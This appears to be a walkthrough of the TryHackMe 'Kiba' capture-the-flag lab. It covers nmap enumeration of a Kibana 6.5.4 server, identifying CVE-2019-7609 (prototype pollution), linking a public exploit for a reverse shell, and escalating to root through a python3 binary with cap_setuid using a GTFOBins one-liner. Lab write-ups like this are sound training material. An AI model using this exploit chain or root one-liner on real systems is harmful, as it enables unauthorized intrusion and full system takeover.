# TryHackMe-Kiba

>Abdullah Rizwan | 10:28 AM | 4th November ,2020

## NMAP

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-04 10:31 PKT
Nmap scan report for 10.10.215.99
Host is up (0.18s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9d:f8:d1:57:13:24:81:b6:18:5d:04:8e:d2:38:4f:90 (RSA)
|   256 e1:e6:7a:a1:a1:1c:be:03:d2:4e:27:1b:0d:0a:ec:b1 (ECDSA)
|_  256 2a:ba:e5:c5:fb:51:38:17:45:e7:b1:54:ca:a1:a3:fc (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
This didn't returned a port on which `kibana` was runinng so let's try enumarting for ports that are greater than 1000

```
ost is up (0.23s latency).                                                                                                                         
Not shown: 65531 closed ports                                                                                                                       
PORT     STATE SERVICE      VERSION                                                                                                                 
22/tcp   open  ssh          OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)                                                            
| ssh-hostkey:                                                                                                                                      
|   2048 9d:f8:d1:57:13:24:81:b6:18:5d:04:8e:d2:38:4f:90 (RSA)                                                                                      
|   256 e1:e6:7a:a1:a1:1c:be:03:d2:4e:27:1b:0d:0a:ec:b1 (ECDSA)                                                                                     
|_  256 2a:ba:e5:c5:fb:51:38:17:45:e7:b1:54:ca:a1:a3:fc (ED25519)                                                                                   
80/tcp   open  http         Apache httpd 2.4.18 ((Ubuntu))                                                                                          
|_http-server-header: Apache/2.4.18 (Ubuntu)                                                                                                        
|_http-title: Site doesn't have a title (text/html).                                                                                                
5044/tcp open  lxi-evntsvc?                                                                                                                         
5601/tcp open  esmagent?                                                                                                                            
| fingerprint-strings:                                                                                                                              
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionR
eq, TLSSessionReq, TerminalServerCookie, X11Probe:                        
|     HTTP/1.1 400 Bad Request                                                                                                                      
|   FourOhFourRequest:                                                                                                                              
|     HTTP/1.1 404 Not Found                                                                                                                        
|     kbn-name: kibana                                                                                                                              
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c                     
|     content-type: application/json; charset=utf-8                       
|     cache-control: no-cache                                             
|     content-length: 60             
|     connection: close              
|     undefined: undefined           
|     Date: Wed, 04 Nov 2020 06:00:22 GMT                                 
|     {"statusCode":404,"error":"Not Found","message":"Not Found"}                                                                                  
|   GetRequest:                      
|     HTTP/1.1 302 Found             
|     location: /app/kibana          
|     kbn-name: kibana               
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c                     
|     cache-control: no-cache                                             
|     content-length: 0              
|     connection: close              
|     undefined: undefined           
|     Date: Wed, 04 Nov 2020 06:00:17 GMT                                 
|   HTTPOptions:                     
|     HTTP/1.1 404 Not Found                                              
|     kbn-name: kibana               
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c                     
|     content-type: application/json; charset=utf-8                       
|     cache-control: no-cache                                             
|     content-length: 38             
|     connection: close              
|     undefined: undefined           
|     Date: Wed, 04 Nov 2020 06:00:17 GMT                                 
|_    {"statusCode":404,"error":"Not Found"}                              
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/
submit.cgi?new-service :             
```


Visting the port `5601`

<img src="https://imgur.com/iHct8wi.png"/>

<img src="https://imgur.com/vr5Yjwg.png"/>

Here you can find the version which kibana is running 

* What is the vulnerability that is specific to programming languages with prototype-based inheritance?

By google search found about `prototype pollution`


* What is the version of visualization dashboard installed in the server?

Version: 6.5.4

* What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000 

CVE-2019-7609

Searching the CVE on google I found a github page 

`https://github.com/mpgn/CVE-2019-7609`


<img src="https://imgur.com/ZVN4udx.png"/>

Now as I soon as I visit the page `canvas` I get a reverse shell

<img src="https://imgur.com/gqFHe6M.png"/>


<img src="https://imgur.com/XCE2Ykw.png"/>

Now on port 80 it was pointed to us about `linux capabilites` so on searching capabilites on linux I came across something called `getcap` that lists the files that have capabilites to run anythin on system,Capabilities is a concept that provides a security system that allows "divide" root privileges into different values


When running `getcap` shell got broke and I tried so many times re deoplying the machine to again get a reverse shell 

Finally after getting a shell I ran the command 

```
kiba@ubuntu:/home/kiba$ getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep

```
```
kiba@ubuntu:/home/kiba$ cd .hackmeplease 
cd .hackmeplease
kiba@ubuntu:/home/kiba/.hackmeplease$ ls -al
ls -al
total 4356
drwxrwxr-x 2 kiba kiba    4096 Mar 31  2020 .
drwxr-xr-x 6 kiba kiba    4096 Nov  3 22:19 ..
-rwxr-xr-x 1 root root 4452016 Mar 31  2020 python3

```
We see that python3 has `capabilites` set so on visiting GTFOBINS

<img src="https://imgur.com/tcHkrvH.png"/>

## Privilege Escalation

`./python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`

```
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
<kmeplease$ ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'   
pwd
/home/kiba/.hackmeplease
id
uid=0(root) gid=1000(kiba) groups=1000(kiba),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
whoami
root

```
